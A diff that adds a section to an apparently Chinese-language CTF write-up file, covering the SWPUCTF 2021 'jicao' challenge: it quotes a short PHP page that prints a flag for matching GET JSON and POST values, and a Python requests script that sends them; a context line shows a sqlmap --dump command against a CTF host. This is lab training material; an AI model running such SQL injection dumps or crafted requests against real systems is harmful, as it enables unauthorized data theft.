@@ -489,3 +489,32 @@ python .\sqlmap.py -u http://node7.anna.nssctf.cn:29274/index.php?wllm=1 --dump
 ![](./img/查看数据库结果.png)
 
 ---
+
+## [SWPUCTF 2021 新生赛]jicao
+* 考点：PHP审计，请求头
+* 工具：python
+
+`index.php`源码如下下：
+
+```php
+<?php
+highlight_file('index.php');
+include("flag.php");
+$id=$_POST['id'];
+$json=json_decode($_GET['json'],true);
+if ($id=="wllmNB"&&$json['x']=="wllm")
+{echo $flag;}
+?>
+```
+其中代码要求上传的请求包中含有和`POST`匹配的的`id=="wllmNB"`以及和`GET`匹配的`json['x']=="wllm"`,构建下面的python代码即可：
+```python
+import requests
+
+url = "http://node7.anna.nssctf.cn:29822/"
+params = {"json": '{"x":"wllm"}'}  # 传递 JSON 格式的 GET 参数
+data = {"id": "wllmNB"}  # 传递 POST 参数
+
+response = requests.post(url, params=params, data=data)
+print(response.text)  # 期待返回 flag
+```
+
